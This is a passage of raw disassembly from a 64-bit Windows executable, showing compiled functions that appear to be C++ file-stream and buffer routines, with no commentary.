   140005ccb:	48 83 ec 20          	sub    $0x20,%rsp
   140005ccf:	48 8d b1 58 ff ff ff 	lea    -0xa8(%rcx),%rsi
   140005cd6:	48 8b d9             	mov    %rcx,%rbx
   140005cd9:	48 8b 06             	mov    (%rsi),%rax
   140005cdc:	8b fa                	mov    %edx,%edi
   140005cde:	4c 63 40 04          	movslq 0x4(%rax),%r8
   140005ce2:	48 8d 05 47 59 00 00 	lea    0x5947(%rip),%rax        # 0x14000b630
   140005ce9:	49 89 84 08 58 ff ff 	mov    %rax,-0xa8(%r8,%rcx,1)
   140005cf0:	ff 
   140005cf1:	48 8b 06             	mov    (%rsi),%rax
   140005cf4:	4c 63 40 04          	movslq 0x4(%rax),%r8
   140005cf8:	45 8d 88 58 ff ff ff 	lea    -0xa8(%r8),%r9d
   140005cff:	45 89 8c 08 54 ff ff 	mov    %r9d,-0xac(%r8,%rcx,1)
   140005d06:	ff 
   140005d07:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
   140005d0b:	e8 e0 fc ff ff       	call   0x1400059f0
   140005d10:	48 8d 8b 68 ff ff ff 	lea    -0x98(%rbx),%rcx
   140005d17:	ff 15 0b 45 00 00    	call   *0x450b(%rip)        # 0x14000a228
   140005d1d:	48 8b cb             	mov    %rbx,%rcx
   140005d20:	ff 15 ea 44 00 00    	call   *0x44ea(%rip)        # 0x14000a210
   140005d26:	40 f6 c7 01          	test   $0x1,%dil
   140005d2a:	74 0d                	je     0x140005d39
   140005d2c:	ba 08 01 00 00       	mov    $0x108,%edx
   140005d31:	48 8b ce             	mov    %rsi,%rcx
   140005d34:	e8 9f 2a 00 00       	call   0x1400087d8
   140005d39:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005d3e:	48 8b c6             	mov    %rsi,%rax
   140005d41:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140005d46:	48 83 c4 20          	add    $0x20,%rsp
   140005d4a:	5f                   	pop    %rdi
   140005d4b:	c3                   	ret
   140005d4c:	cc                   	int3
   140005d4d:	cc                   	int3
   140005d4e:	cc                   	int3
   140005d4f:	cc                   	int3
   140005d50:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005d55:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140005d5a:	57                   	push   %rdi
   140005d5b:	48 83 ec 20          	sub    $0x20,%rsp
   140005d5f:	48 8d b1 78 ff ff ff 	lea    -0x88(%rcx),%rsi
   140005d66:	48 8b d9             	mov    %rcx,%rbx
   140005d69:	48 8b 06             	mov    (%rsi),%rax
   140005d6c:	8b fa                	mov    %edx,%edi
   140005d6e:	4c 63 40 04          	movslq 0x4(%rax),%r8
   140005d72:	48 8d 05 07 58 00 00 	lea    0x5807(%rip),%rax        # 0x14000b580
   140005d79:	49 89 84 08 78 ff ff 	mov    %rax,-0x88(%r8,%rcx,1)
   140005d80:	ff 
   140005d81:	48 8b 06             	mov    (%rsi),%rax
   140005d84:	4c 63 40 04          	movslq 0x4(%rax),%r8
   140005d88:	45 8d 88 78 ff ff ff 	lea    -0x88(%r8),%r9d
   140005d8f:	45 89 8c 08 74 ff ff 	mov    %r9d,-0x8c(%r8,%rcx,1)
   140005d96:	ff 
   140005d97:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
   140005d9b:	e8 c0 fc ff ff       	call   0x140005a60
   140005da0:	48 8d 4b 88          	lea    -0x78(%rbx),%rcx
   140005da4:	ff 15 7e 44 00 00    	call   *0x447e(%rip)        # 0x14000a228
   140005daa:	48 8b cb             	mov    %rbx,%rcx
   140005dad:	ff 15 5d 44 00 00    	call   *0x445d(%rip)        # 0x14000a210
   140005db3:	40 f6 c7 01          	test   $0x1,%dil
   140005db7:	74 0d                	je     0x140005dc6
   140005db9:	ba e8 00 00 00       	mov    $0xe8,%edx
   140005dbe:	48 8b ce             	mov    %rsi,%rcx
   140005dc1:	e8 12 2a 00 00       	call   0x1400087d8
   140005dc6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005dcb:	48 8b c6             	mov    %rsi,%rax
   140005dce:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140005dd3:	48 83 c4 20          	add    $0x20,%rsp
   140005dd7:	5f                   	pop    %rdi
   140005dd8:	c3                   	ret
   140005dd9:	cc                   	int3
   140005dda:	cc                   	int3
   140005ddb:	cc                   	int3
   140005ddc:	cc                   	int3
   140005ddd:	cc                   	int3
   140005dde:	cc                   	int3
   140005ddf:	cc                   	int3
   140005de0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005de5:	57                   	push   %rdi
   140005de6:	48 83 ec 20          	sub    $0x20,%rsp
   140005dea:	8b da                	mov    %edx,%ebx
   140005dec:	48 8b f9             	mov    %rcx,%rdi
   140005def:	e8 6c fc ff ff       	call   0x140005a60
   140005df4:	f6 c3 01             	test   $0x1,%bl
   140005df7:	74 0d                	je     0x140005e06
   140005df9:	ba 78 00 00 00       	mov    $0x78,%edx
   140005dfe:	48 8b cf             	mov    %rdi,%rcx
   140005e01:	e8 d2 29 00 00       	call   0x1400087d8
   140005e06:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005e0b:	48 8b c7             	mov    %rdi,%rax
   140005e0e:	48 83 c4 20          	add    $0x20,%rsp
   140005e12:	5f                   	pop    %rdi
   140005e13:	c3                   	ret
   140005e14:	cc                   	int3
   140005e15:	cc                   	int3
   140005e16:	cc                   	int3
   140005e17:	cc                   	int3
   140005e18:	cc                   	int3
   140005e19:	cc                   	int3
   140005e1a:	cc                   	int3
   140005e1b:	cc                   	int3
   140005e1c:	cc                   	int3
   140005e1d:	cc                   	int3
   140005e1e:	cc                   	int3
   140005e1f:	cc                   	int3
   140005e20:	40 53                	rex push %rbx
   140005e22:	48 83 ec 60          	sub    $0x60,%rsp
   140005e26:	48 8b 05 93 cd 00 00 	mov    0xcd93(%rip),%rax        # 0x140012bc0
   140005e2d:	48 33 c4             	xor    %rsp,%rax
   140005e30:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140005e35:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   140005e3a:	48 8b d9             	mov    %rcx,%rbx
   140005e3d:	0f 84 b0 00 00 00    	je     0x140005ef3
   140005e43:	80 79 71 00          	cmpb   $0x0,0x71(%rcx)
   140005e47:	0f 84 a6 00 00 00    	je     0x140005ef3
   140005e4d:	48 8b 01             	mov    (%rcx),%rax
   140005e50:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   140005e55:	48 89 7c 24 78       	mov    %rdi,0x78(%rsp)
   140005e5a:	ff 50 18             	call   *0x18(%rax)
   140005e5d:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005e60:	0f 84 89 00 00 00    	je     0x140005eef
   140005e66:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   140005e6a:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140005e6f:	48 8d 53 74          	lea    0x74(%rbx),%rdx
   140005e73:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005e78:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   140005e7d:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140005e82:	ff 15 b0 42 00 00    	call   *0x42b0(%rip)        # 0x14000a138
   140005e88:	85 c0                	test   %eax,%eax
   140005e8a:	74 28                	je     0x140005eb4
   140005e8c:	83 e8 01             	sub    $0x1,%eax
   140005e8f:	74 27                	je     0x140005eb8
   140005e91:	83 f8 02             	cmp    $0x2,%eax
   140005e94:	75 59                	jne    0x140005eef
   140005e96:	c6 43 71 00          	movb   $0x0,0x71(%rbx)
   140005e9a:	b0 01                	mov    $0x1,%al
   140005e9c:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140005ea1:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140005ea6:	48 33 cc             	xor    %rsp,%rcx
   140005ea9:	e8 c2 29 00 00       	call   0x140008870
   140005eae:	48 83 c4 60          	add    $0x60,%rsp
   140005eb2:	5b                   	pop    %rbx
   140005eb3:	c3                   	ret
   140005eb4:	c6 43 71 00          	movb   $0x0,0x71(%rbx)
   140005eb8:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140005ebd:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140005ec2:	48 2b f8             	sub    %rax,%rdi
   140005ec5:	74 1f                	je     0x140005ee6
   140005ec7:	4c 8b 8b 80 00 00 00 	mov    0x80(%rbx),%r9
   140005ece:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140005ed3:	4c 8b c7             	mov    %rdi,%r8
   140005ed6:	ba 01 00 00 00       	mov    $0x1,%edx
   140005edb:	ff 15 0f 46 00 00    	call   *0x460f(%rip)        # 0x14000a4f0
   140005ee1:	48 3b f8             	cmp    %rax,%rdi
   140005ee4:	75 09                	jne    0x140005eef
   140005ee6:	80 7b 71 00          	cmpb   $0x0,0x71(%rbx)
   140005eea:	0f 94 c0             	sete   %al
   140005eed:	eb ad                	jmp    0x140005e9c
   140005eef:	32 c0                	xor    %al,%al
   140005ef1:	eb a9                	jmp    0x140005e9c
   140005ef3:	b0 01                	mov    $0x1,%al
   140005ef5:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140005efa:	48 33 cc             	xor    %rsp,%rcx
   140005efd:	e8 6e 29 00 00       	call   0x140008870
   140005f02:	48 83 c4 60          	add    $0x60,%rsp
   140005f06:	5b                   	pop    %rbx
   140005f07:	c3                   	ret
   140005f08:	cc                   	int3
   140005f09:	cc                   	int3
   140005f0a:	cc                   	int3
   140005f0b:	cc                   	int3
   140005f0c:	cc                   	int3
   140005f0d:	cc                   	int3
   140005f0e:	cc                   	int3
   140005f0f:	cc                   	int3
   140005f10:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140005f17:	48 85 c9             	test   %rcx,%rcx
   140005f1a:	74 07                	je     0x140005f23
   140005f1c:	48 ff 25 75 44 00 00 	rex.W jmp *0x4475(%rip)        # 0x14000a398
   140005f23:	c3                   	ret
   140005f24:	cc                   	int3
   140005f25:	cc                   	int3
   140005f26:	cc                   	int3
   140005f27:	cc                   	int3
   140005f28:	cc                   	int3
   140005f29:	cc                   	int3
   140005f2a:	cc                   	int3
   140005f2b:	cc                   	int3
   140005f2c:	cc                   	int3
   140005f2d:	cc                   	int3
   140005f2e:	cc                   	int3
   140005f2f:	cc                   	int3
   140005f30:	40 53                	rex push %rbx
   140005f32:	48 83 ec 20          	sub    $0x20,%rsp
   140005f36:	48 8b d9             	mov    %rcx,%rbx
   140005f39:	ff 15 29 42 00 00    	call   *0x4229(%rip)        # 0x14000a168
   140005f3f:	48 8d 53 70          	lea    0x70(%rbx),%rdx
   140005f43:	48 3b c2             	cmp    %rdx,%rax
   140005f46:	75 20                	jne    0x140005f68
   140005f48:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   140005f4f:	48 8b cb             	mov    %rbx,%rcx
   140005f52:	4c 8b 8b 90 00 00 00 	mov    0x90(%rbx),%r9
   140005f59:	4c 8b c2             	mov    %rdx,%r8
   140005f5c:	48 83 c4 20          	add    $0x20,%rsp
   140005f60:	5b                   	pop    %rbx
   140005f61:	48 ff 25 30 42 00 00 	rex.W jmp *0x4230(%rip)        # 0x14000a198
   140005f68:	48 83 c4 20          	add    $0x20,%rsp
   140005f6c:	5b                   	pop    %rbx
   140005f6d:	c3                   	ret
   140005f6e:	cc                   	int3
   140005f6f:	cc                   	int3
   140005f70:	48 83 ec 48          	sub    $0x48,%rsp
   140005f74:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005f79:	e8 42 fa ff ff       	call   0x1400059c0
   140005f7e:	48 8d 15 1b 98 00 00 	lea    0x981b(%rip),%rdx        # 0x14000f7a0
   140005f85:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005f8a:	e8 a3 36 00 00       	call   0x140009632
   140005f8f:	cc                   	int3
   140005f90:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140005f97:	48 85 c9             	test   %rcx,%rcx
   140005f9a:	74 07                	je     0x140005fa3
   140005f9c:	48 ff 25 fd 43 00 00 	rex.W jmp *0x43fd(%rip)        # 0x14000a3a0
   140005fa3:	c3                   	ret
   140005fa4:	cc                   	int3
   140005fa5:	cc                   	int3
   140005fa6:	cc                   	int3
   140005fa7:	cc                   	int3
   140005fa8:	cc                   	int3
   140005fa9:	cc                   	int3
   140005faa:	cc                   	int3
   140005fab:	cc                   	int3
   140005fac:	cc                   	int3
   140005fad:	cc                   	int3
   140005fae:	cc                   	int3
   140005faf:	cc                   	int3
   140005fb0:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140005fb5:	57                   	push   %rdi
   140005fb6:	48 83 ec 20          	sub    $0x20,%rsp
   140005fba:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140005fc1:	00 
   140005fc2:	48 8b f9             	mov    %rcx,%rdi
   140005fc5:	74 5a                	je     0x140006021
   140005fc7:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140005fcc:	ff 15 96 41 00 00    	call   *0x4196(%rip)        # 0x14000a168
   140005fd2:	48 8d 57 70          	lea    0x70(%rdi),%rdx
   140005fd6:	48 3b c2             	cmp    %rdx,%rax
   140005fd9:	75 1a                	jne    0x140005ff5
   140005fdb:	48 8b 97 88 00 00 00 	mov    0x88(%rdi),%rdx
   140005fe2:	48 8b cf             	mov    %rdi,%rcx
   140005fe5:	4c 8b 8f 90 00 00 00 	mov    0x90(%rdi),%r9
   140005fec:	4c 8b c2             	mov    %rdx,%r8
   140005fef:	ff 15 a3 41 00 00    	call   *0x41a3(%rip)        # 0x14000a198
   140005ff5:	48 8b cf             	mov    %rdi,%rcx
   140005ff8:	e8 23 fe ff ff       	call   0x140005e20
   140005ffd:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   140006004:	33 db                	xor    %ebx,%ebx
   140006006:	84 c0                	test   %al,%al
   140006008:	48 0f 45 df          	cmovne %rdi,%rbx
   14000600c:	ff 15 ee 44 00 00    	call   *0x44ee(%rip)        # 0x14000a500
   140006012:	33 f6                	xor    %esi,%esi
   140006014:	85 c0                	test   %eax,%eax
   140006016:	48 0f 44 f3          	cmove  %rbx,%rsi
   14000601a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000601f:	eb 02                	jmp    0x140006023
   140006021:	33 f6                	xor    %esi,%esi
   140006023:	48 8b cf             	mov    %rdi,%rcx
   140006026:	c6 47 7c 00          	movb   $0x0,0x7c(%rdi)
   14000602a:	c6 47 71 00          	movb   $0x0,0x71(%rdi)
   14000602e:	ff 15 b4 41 00 00    	call   *0x41b4(%rip)        # 0x14000a1e8
   140006034:	48 c7 87 80 00 00 00 	movq   $0x0,0x80(%rdi)
   14000603b:	00 00 00 00 
   14000603f:	48 8b c6             	mov    %rsi,%rax
   140006042:	48 8b 0d a7 cf 00 00 	mov    0xcfa7(%rip),%rcx        # 0x140012ff0
   140006049:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000604e:	48 89 4f 74          	mov    %rcx,0x74(%rdi)
   140006052:	48 c7 47 68 00 00 00 	movq   $0x0,0x68(%rdi)
   140006059:	00 
   14000605a:	48 83 c4 20          	add    $0x20,%rsp
   14000605e:	5f                   	pop    %rdi
   14000605f:	c3                   	ret
   140006060:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006065:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000606a:	55                   	push   %rbp
   14000606b:	57                   	push   %rdi
   14000606c:	41 56                	push   %r14
   14000606e:	48 8d 6c 24 b0       	lea    -0x50(%rsp),%rbp
   140006073:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   14000607a:	48 8b f1             	mov    %rcx,%rsi
   14000607d:	48 89 4d 40          	mov    %rcx,0x40(%rbp)
   140006081:	33 ff                	xor    %edi,%edi
   140006083:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140006087:	33 c9                	xor    %ecx,%ecx
   140006089:	ff 15 b9 44 00 00    	call   *0x44b9(%rip)        # 0x14000a548
   14000608f:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140006094:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006099:	ff 15 b1 44 00 00    	call   *0x44b1(%rip)        # 0x14000a550
   14000609f:	48 8b d8             	mov    %rax,%rbx
   1400060a2:	48 8d 05 df 54 00 00 	lea    0x54df(%rip),%rax        # 0x14000b588
   1400060a9:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400060ae:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   1400060b2:	ff 15 60 41 00 00    	call   *0x4160(%rip)        # 0x14000a218
   1400060b8:	90                   	nop
   1400060b9:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   1400060c0:	00 
   1400060c1:	45 33 c9             	xor    %r9d,%r9d
   1400060c4:	45 33 c0             	xor    %r8d,%r8d
   1400060c7:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   1400060cc:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400060d1:	ff 15 49 41 00 00    	call   *0x4149(%rip)        # 0x14000a220
   1400060d7:	90                   	nop
   1400060d8:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400060dd:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400060e1:	4c 8d 35 98 54 00 00 	lea    0x5498(%rip),%r14        # 0x14000b580
   1400060e8:	4c 89 74 0c 50       	mov    %r14,0x50(%rsp,%rcx,1)
   1400060ed:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400060f2:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400060f6:	8d 91 78 ff ff ff    	lea    -0x88(%rcx),%edx
   1400060fc:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   140006100:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140006105:	ff 15 45 40 00 00    	call   *0x4045(%rip)        # 0x14000a150
   14000610b:	48 8d 05 ee 53 00 00 	lea    0x53ee(%rip),%rax        # 0x14000b500
   140006112:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140006117:	48 89 7d c0          	mov    %rdi,-0x40(%rbp)
   14000611b:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%rbp)
   140006122:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140006127:	48 8d 05 62 54 00 00 	lea    0x5462(%rip),%rax        # 0x14000b590
   14000612e:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140006133:	48 ff c0             	inc    %rax
   140006136:	80 38 00             	cmpb   $0x0,(%rax)
   140006139:	75 f8                	jne    0x140006133
   14000613b:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140006140:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   140006145:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000614a:	e8 21 f2 ff ff       	call   0x140005370
   14000614f:	90                   	nop
   140006150:	0f 57 c0             	xorps  %xmm0,%xmm0
   140006153:	0f 11 06             	movups %xmm0,(%rsi)
   140006156:	48 89 7e 10          	mov    %rdi,0x10(%rsi)
   14000615a:	48 c7 46 18 0f 00 00 	movq   $0xf,0x18(%rsi)
   140006161:	00 
   140006162:	c6 06 00             	movb   $0x0,(%rsi)
   140006165:	c7 44 24 20 0a 00 00 	movl   $0xa,0x20(%rsp)
   14000616c:	00 
   14000616d:	0f 11 44 24 28       	movups %xmm0,0x28(%rsp)
   140006172:	8b 4d c8             	mov    -0x38(%rbp),%ecx
   140006175:	8b c1                	mov    %ecx,%eax
   140006177:	24 22                	and    $0x22,%al
   140006179:	3c 02                	cmp    $0x2,%al
   14000617b:	74 48                	je     0x1400061c5
   14000617d:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140006182:	ff 15 f8 3f 00 00    	call   *0x3ff8(%rip)        # 0x14000a180
   140006188:	48 85 c0             	test   %rax,%rax
   14000618b:	74 35                	je     0x1400061c2
   14000618d:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140006192:	ff 15 e0 3f 00 00    	call   *0x3fe0(%rip)        # 0x14000a178
   140006198:	48 8b f8             	mov    %rax,%rdi
   14000619b:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400061a0:	ff 15 da 3f 00 00    	call   *0x3fda(%rip)        # 0x14000a180
   1400061a6:	48 8b d8             	mov    %rax,%rbx
   1400061a9:	48 3b 45 c0          	cmp    -0x40(%rbp),%rax
   1400061ad:	48 0f 42 5d c0       	cmovb  -0x40(%rbp),%rbx
   1400061b2:	48 2b df             	sub    %rdi,%rbx
   1400061b5:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400061ba:	ff 15 e0 3f 00 00    	call   *0x3fe0(%rip)        # 0x14000a1a0
   1400061c0:	eb 43                	jmp    0x140006205
   1400061c2:	8b 4d c8             	mov    -0x38(%rbp),%ecx
   1400061c5:	f6 c1 04             	test   $0x4,%cl
   1400061c8:	75 31                	jne    0x1400061fb
   1400061ca:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400061cf:	ff 15 9b 3f 00 00    	call   *0x3f9b(%rip)        # 0x14000a170
   1400061d5:	48 85 c0             	test   %rax,%rax
   1400061d8:	74 21                	je     0x1400061fb
   1400061da:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400061df:	ff 15 83 3f 00 00    	call   *0x3f83(%rip)        # 0x14000a168
   1400061e5:	48 8b f8             	mov    %rax,%rdi
   1400061e8:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400061ed:	ff 15 95 3f 00 00    	call   *0x3f95(%rip)        # 0x14000a188
   1400061f3:	48 8b d8             	mov    %rax,%rbx
   1400061f6:	48 2b df             	sub    %rdi,%rbx
   1400061f9:	eb 0a                	jmp    0x140006205
   1400061fb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006200:	48 8b 7c 24 28       	mov    0x28(%rsp),%rdi
   140006205:	48 85 ff             	test   %rdi,%rdi
   140006208:	74 0f                	je     0x140006219
   14000620a:	4c 8b c3             	mov    %rbx,%r8
   14000620d:	48 8b d7             	mov    %rdi,%rdx
   140006210:	48 8b ce             	mov    %rsi,%rcx
   140006213:	e8 28 bb ff ff       	call   0x140001d40
   140006218:	90                   	nop
   140006219:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   14000621e:	48 63 51 04          	movslq 0x4(%rcx),%rdx
   140006222:	4c 89 74 14 50       	mov    %r14,0x50(%rsp,%rdx,1)
   140006227:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   14000622c:	48 63 51 04          	movslq 0x4(%rcx),%rdx
   140006230:	44 8d 82 78 ff ff ff 	lea    -0x88(%rdx),%r8d
   140006237:	44 89 44 14 4c       	mov    %r8d,0x4c(%rsp,%rdx,1)
   14000623c:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140006241:	e8 1a f8 ff ff       	call   0x140005a60
   140006246:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000624b:	ff 15 d7 3f 00 00    	call   *0x3fd7(%rip)        # 0x14000a228
   140006251:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140006255:	ff 15 b5 3f 00 00    	call   *0x3fb5(%rip)        # 0x14000a210
   14000625b:	48 8b c6             	mov    %rsi,%rax
   14000625e:	4c 8d 9c 24 50 01 00 	lea    0x150(%rsp),%r11
   140006265:	00 
   140006266:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   14000626a:	49 8b 73 30          	mov    0x30(%r11),%rsi
   14000626e:	49 8b e3             	mov    %r11,%rsp
   140006271:	41 5e                	pop    %r14
   140006273:	5f                   	pop    %rdi
   140006274:	5d                   	pop    %rbp
   140006275:	c3                   	ret
   140006276:	cc                   	int3
   140006277:	cc                   	int3
   140006278:	cc                   	int3
   140006279:	cc                   	int3
   14000627a:	cc                   	int3
   14000627b:	cc                   	int3
   14000627c:	cc                   	int3
   14000627d:	cc                   	int3
   14000627e:	cc                   	int3
   14000627f:	cc                   	int3
   140006280:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006285:	57                   	push   %rdi
   140006286:	48 83 ec 20          	sub    $0x20,%rsp
   14000628a:	48 8b d9             	mov    %rcx,%rbx
   14000628d:	48 8b ca             	mov    %rdx,%rcx
   140006290:	e8 bb f3 ff ff       	call   0x140005650
   140006295:	48 8b c8             	mov    %rax,%rcx
   140006298:	48 8b f8             	mov    %rax,%rdi
   14000629b:	ff 15 7f 3e 00 00    	call   *0x3e7f(%rip)        # 0x14000a120
   1400062a1:	84 c0                	test   %al,%al
   1400062a3:	74 13                	je     0x1400062b8
   1400062a5:	48 c7 43 68 00 00 00 	movq   $0x0,0x68(%rbx)
   1400062ac:	00 
   1400062ad:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400062b2:	48 83 c4 20          	add    $0x20,%rsp
   1400062b6:	5f                   	pop    %rdi
   1400062b7:	c3                   	ret
   1400062b8:	48 8b cb             	mov    %rbx,%rcx
   1400062bb:	48 89 7b 68          	mov    %rdi,0x68(%rbx)
   1400062bf:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400062c4:	48 83 c4 20          	add    $0x20,%rsp
   1400062c8:	5f                   	pop    %rdi
   1400062c9:	48 ff 25 18 3f 00 00 	rex.W jmp *0x3f18(%rip)        # 0x14000a1e8
   1400062d0:	40 53                	rex push %rbx
   1400062d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400062d6:	ba 40 00 00 00       	mov    $0x40,%edx
   1400062db:	41 b8 c0 01 00 00    	mov    $0x1c0,%r8d
   1400062e1:	48 8b d9             	mov    %rcx,%rbx
   1400062e4:	ff 15 f6 3f 00 00    	call   *0x3ff6(%rip)        # 0x14000a2e0
   1400062ea:	48 8b c3             	mov    %rbx,%rax
   1400062ed:	48 83 c4 20          	add    $0x20,%rsp
   1400062f1:	5b                   	pop    %rbx
   1400062f2:	c3                   	ret
   1400062f3:	cc                   	int3
   1400062f4:	cc                   	int3
   1400062f5:	cc                   	int3
   1400062f6:	cc                   	int3
   1400062f7:	cc                   	int3
   1400062f8:	cc                   	int3
   1400062f9:	cc                   	int3
   1400062fa:	cc                   	int3
   1400062fb:	cc                   	int3
   1400062fc:	cc                   	int3
   1400062fd:	cc                   	int3
   1400062fe:	cc                   	int3
   1400062ff:	cc                   	int3
   140006300:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140006305:	57                   	push   %rdi
   140006306:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   14000630d:	48 8b 05 ac c8 00 00 	mov    0xc8ac(%rip),%rax        # 0x140012bc0
   140006314:	48 33 c4             	xor    %rsp,%rax
   140006317:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   14000631c:	8b f2                	mov    %edx,%esi
   14000631e:	48 8b f9             	mov    %rcx,%rdi
   140006321:	83 fa ff             	cmp    $0xffffffff,%edx
   140006324:	75 07                	jne    0x14000632d
   140006326:	33 c0                	xor    %eax,%eax
   140006328:	e9 69 01 00 00       	jmp    0x140006496
   14000632d:	48 89 9c 24 a0 00 00 	mov    %rbx,0xa0(%rsp)
   140006334:	00 
   140006335:	ff 15 45 3e 00 00    	call   *0x3e45(%rip)        # 0x14000a180
   14000633b:	48 85 c0             	test   %rax,%rax
   14000633e:	74 2d                	je     0x14000636d
   140006340:	48 8b cf             	mov    %rdi,%rcx
   140006343:	ff 15 57 3e 00 00    	call   *0x3e57(%rip)        # 0x14000a1a0
   140006349:	48 8b cf             	mov    %rdi,%rcx
   14000634c:	48 8b d8             	mov    %rax,%rbx
   14000634f:	ff 15 2b 3e 00 00    	call   *0x3e2b(%rip)        # 0x14000a180
   140006355:	48 3b c3             	cmp    %rbx,%rax
   140006358:	73 13                	jae    0x14000636d
   14000635a:	48 8b cf             	mov    %rdi,%rcx
   14000635d:	ff 15 75 3e 00 00    	call   *0x3e75(%rip)        # 0x14000a1d8
   140006363:	40 88 30             	mov    %sil,(%rax)
   140006366:	8b c6                	mov    %esi,%eax
   140006368:	e9 21 01 00 00       	jmp    0x14000648e
   14000636d:	48 83 bf 80 00 00 00 	cmpq   $0x0,0x80(%rdi)
   140006374:	00 
   140006375:	0f 84 0e 01 00 00    	je     0x140006489
   14000637b:	48 8b cf             	mov    %rdi,%rcx
   14000637e:	ff 15 e4 3d 00 00    	call   *0x3de4(%rip)        # 0x14000a168
   140006384:	48 8d 4f 70          	lea    0x70(%rdi),%rcx
   140006388:	48 3b c1             	cmp    %rcx,%rax
   14000638b:	75 1a                	jne    0x1400063a7
   14000638d:	48 8b 97 88 00 00 00 	mov    0x88(%rdi),%rdx
   140006394:	48 8b cf             	mov    %rdi,%rcx
   140006397:	4c 8b 8f 90 00 00 00 	mov    0x90(%rdi),%r9
   14000639e:	4c 8b c2             	mov    %rdx,%r8
   1400063a1:	ff 15 f1 3d 00 00    	call   *0x3df1(%rip)        # 0x14000a198
   1400063a7:	48 8b 4f 68          	mov    0x68(%rdi),%rcx
   1400063ab:	48 85 c9             	test   %rcx,%rcx
   1400063ae:	75 22                	jne    0x1400063d2
   1400063b0:	48 8b 97 80 00 00 00 	mov    0x80(%rdi),%rdx
   1400063b7:	40 0f be ce          	movsbl %sil,%ecx
   1400063bb:	ff 15 f7 40 00 00    	call   *0x40f7(%rip)        # 0x14000a4b8
   1400063c1:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   1400063c6:	3b c1                	cmp    %ecx,%eax
   1400063c8:	0f 45 ce             	cmovne %esi,%ecx
   1400063cb:	8b c1                	mov    %ecx,%eax
